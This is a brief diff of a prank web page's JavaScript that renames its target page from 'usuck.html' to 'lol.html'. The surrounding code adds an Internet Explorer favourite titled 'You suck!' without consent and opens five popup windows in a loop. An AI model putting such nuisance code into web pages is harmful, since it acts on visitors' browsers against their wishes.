@@ -1,6 +1,6 @@
 function bookmark() {
 	if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
-		var url = "usuck.html";
+		var url = "lol.html";
 		var title = "You suck!";
 		
 		window.external.AddFavorite(url, title);
@@ -23,7 +23,7 @@ function openWindow(url) {
 
 function proCreate() {	
 	for (var i = 0; i < 5; i++) {
-		openWindow('usuck.html');
+		openWindow('lol.html');
 	}
 }
 
